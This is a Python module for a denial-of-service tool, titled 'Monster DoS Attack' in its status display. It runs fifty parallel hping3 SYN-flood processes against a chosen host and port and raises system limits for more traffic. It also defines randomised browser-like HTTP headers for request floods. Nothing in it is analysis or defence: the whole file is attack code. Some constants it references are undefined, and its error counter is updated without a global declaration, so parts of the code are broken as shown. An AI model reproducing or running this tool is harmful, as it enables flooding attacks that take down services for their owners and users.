###########
# IMPORTS #
###########
import asyncio
import socket
import random
import string
import sys
import ssl
import subprocess
import time
import os
import threading
import shutil
from rich.console import Console

############
# PRE-DEFS #
############
console = Console()

############
# COUNTERS #
############
lock_counter = threading.Lock()
start_time = 0
total_errors = 0
running = True
processes = []

##################
# CONFIGURATIONS #
##################
USE_HPING3 = False
NUM_TASKS = 50

################
# BUILD HEADER #
################
def build_header(host, port):
    path = f"/?{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}={random.randint(1, 999999)}"
    header = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: max-age=0\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
        f"Accept-Language: {random.choice(ACCEPT_LANGUAGES)}\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        f"Sec-Ch-Ua: {random.choice(SEC_CH_UA)}\r\n"
        f"Sec-Ch-Ua-Mobile: {random.choice(SEC_CH_UA_MOBILE)}\r\n"
        f"Sec-Ch-Ua-Platform: {random.choice(SEC_CH_UA_PLATFORM)}\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "\r\n"
    )
    return header

def pre_generate_headers(host, port, size=2000):
    global HEADER_POOL
    HEADER_POOL = [build_header(host, port) for _ in range(size)]

def get_random_header():
    return random.choice(HEADER_POOL)

###########################
# HPING3 SYN FLOOD ATTACK #
##########################
def find_hping3():
    hping3_path = shutil.which("hping3")
    if hping3_path is None:
        possible_paths = ["/usr/sbin/hping3", "/usr/bin/hping3", "/sbin/hping3"]
        for path in possible_paths:
            if os.path.exists(path) and os.access(path, os.X_OK):
                hping3_path = path
                break
    if hping3_path is None:
        print("[!] hping3 not found. Install it and try again.")
        sys.exit(1)
    return hping3_path

async def hping3_syn_task(host, port, hping3_path):
    global processes
    cmd = [hping3_path, "-S", "-p", str(port), "--flood", host]
    while True:
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            with lock_counter:
                processes.append(proc)
            await proc.wait()
        except asyncio.CancelledError:
            return
        except KeyboardInterrupt:
            return
        except Exception as e:
            with lock_counter:
                total_errors += 1
                n = total_errors
            if n == 1:
                print(f"[!] hping3 failed: {e} — check CAP_NET_RAW / sudo")
            await asyncio.sleep(0.5)
            continue

###########
# DISPLAY #
###########
def update_display(host, port, mode):
    global start_time, running
    while running:
        elapsed = time.time() - start_time
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 50)
        print("\033[0;35m  Monster DoS Attack Status (SYN Flood / hping3)")
        print("=" * 50)
        print(f"  Host:Port     : {host}:{port}")
        print(f"  Uptime (s)    : {int(elapsed)}")
        print(f"  Tasks         : {NUM_TASKS}")
        print("=" * 50)
        print("\033[31m  [Press Ctrl+C to stop]")
        time.sleep(1)

##############
# MAIN ASYNC #
##############
async def main_attack(host, port):
    global start_time, running, processes
    start_time = time.time()
    hping3_path = find_hping3()
    thread = threading.Thread(target=update_display, args=(host, port, "hping3"))
    thread.daemon = True
    thread.start()
    attack_tasks = [asyncio.create_task(hping3_syn_task(host, port, hping3_path)) for _ in range(NUM_TASKS)]

    try:
        await asyncio.gather(*attack_tasks)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting immediately...")
        running = False
        with lock_counter:
            for proc in processes:
                try:
                    proc.terminate()
                except:
                    pass
        thread.join(timeout=1)
        sys.exit(0)

##############
# RUNNER     #
##############
def run(host, port, type):
    print(f"[DEBUG] run() called for {host}:{port} (type: {type})")

    if sys.platform.startswith('linux'):
        try:
            subprocess.run("ulimit -n 65535", shell=True, check=False)
            subprocess.run("sysctl -w net.ipv4.ip_local_port_range='1024 65535'", shell=True, check=False, stderr=subprocess.DEVNULL)
            subprocess.run("sysctl -w net.ipv4.tcp_tw_reuse=1", shell=True, check=False, stderr=subprocess.DEVNULL)
        except:
            pass

    try:
        asyncio.run(main_attack(host, port))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)
